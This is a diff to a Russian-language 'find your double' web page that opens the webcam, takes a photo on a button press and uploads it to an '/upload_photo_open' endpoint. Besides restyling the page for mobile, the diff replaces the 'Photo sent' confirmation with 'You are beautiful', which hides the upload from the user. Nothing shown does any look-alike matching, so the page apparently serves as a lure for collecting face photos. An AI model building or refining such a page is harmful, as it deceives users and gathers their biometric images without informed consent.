@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <title>Найди своего двойника 👯‍♂️</title>
   <style>
     body {
@@ -20,50 +20,58 @@
     }
 
     h1 {
-      font-size: 2.6em;
+      font-size: 2.2em;
       background: linear-gradient(90deg, #ff66cc, #66ccff, #9b5cff);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       animation: glow 3s ease-in-out infinite alternate;
-      margin-bottom: 15px;
+      margin-bottom: 10px;
+      padding: 0 10px;
     }
 
     p {
-      font-size: 1.2em;
+      font-size: 1.1em;
       color: rgba(255, 255, 255, 0.8);
-      margin-bottom: 40px;
+      margin-bottom: 25px;
       animation: fadeIn 2s ease-in-out;
+      padding: 0 20px;
     }
 
     video {
-      width: 340px;
-      height: 260px;
+      width: 90vw;
+      max-width: 420px;
+      height: auto;
       border-radius: 18px;
       border: 2px solid rgba(255,255,255,0.2);
       box-shadow: 0 0 25px rgba(255,255,255,0.1);
-      backdrop-filter: blur(8px);
       background: rgba(255,255,255,0.05);
       animation: fadeIn 1.5s ease-in;
       transform: scaleX(-1); /* зеркальное отображение */
     }
 
     button {
+      position: fixed;
+      bottom: 40px;
       background: linear-gradient(90deg, #ff66cc, #66ccff);
       border: none;
-      border-radius: 30px;
-      padding: 15px 40px;
-      margin-top: 30px;
-      font-size: 1.1em;
+      border-radius: 50px;
+      padding: 18px 60px;
+      font-size: 1.2em;
       font-weight: bold;
       color: #fff;
       cursor: pointer;
-      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
-      transition: 0.3s;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+      transition: 0.3s ease;
     }
 
     button:hover {
       transform: scale(1.08);
-      box-shadow: 0 0 25px rgba(255,255,255,0.4);
+      box-shadow: 0 0 25px rgba(255,255,255,0.5);
+    }
+
+    button:active {
+      transform: scale(0.95);
+      opacity: 0.9;
     }
 
     .flash {
@@ -80,20 +88,32 @@
 
     footer {
       position: absolute;
-      bottom: 15px;
+      bottom: 10px;
       font-size: 0.9em;
       color: rgba(255,255,255,0.6);
       animation: fadeIn 3s ease-in-out;
     }
 
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(30px); }
+      from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
     }
 
     @keyframes glow {
       from { text-shadow: 0 0 10px #ff99ff, 0 0 20px #66ccff; }
       to { text-shadow: 0 0 25px #ff66cc, 0 0 40px #99ccff; }
+    }
+
+    /* 📱 Мобильная адаптация */
+    @media (max-width: 768px) {
+      h1 { font-size: 1.8em; }
+      p { font-size: 1em; margin-bottom: 20px; }
+      button {
+        width: 90%;
+        bottom: 30px;
+        padding: 15px 0;
+        font-size: 1em;
+      }
     }
   </style>
 </head>
@@ -102,7 +122,7 @@
   <div class="flash" id="flash"></div>
 
   <h1>Сделай фото и найди своего двойника 👯‍♂️</h1>
-  <p>Посмотри в камеру и улыбнись — вдруг где-то живёт твоя копия 😄</p>
+  <p>Улыбнись в камеру — возможно, где-то живёт твой клон 😄</p>
 
   <video id="camera" autoplay playsinline></video>
   <button onclick="takePhoto()">📸 Сделать фото</button>
@@ -113,9 +133,9 @@
     const video = document.getElementById('camera');
     const flash = document.getElementById('flash');
 
-    navigator.mediaDevices.getUserMedia({ video: true })
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
       .then(stream => video.srcObject = stream)
-      .catch(() => alert('Нужно разрешить доступ к камере 😅'));
+      .catch(() => alert('Разреши доступ к камере, пожалуйста 😅'));
 
     function takePhoto() {
       flash.style.opacity = 1;
@@ -131,7 +151,7 @@
         const formData = new FormData();
         formData.append('photo', blob, 'photo.png');
         fetch('/upload_photo_open', { method: 'POST', body: formData })
-          .then(() => alert('Фото отправлено 💌'))
+          .then(() => alert('Вы прекрасны 💌'))
           .catch(() => alert('Ошибка при отправке 😢'));
       });
     }
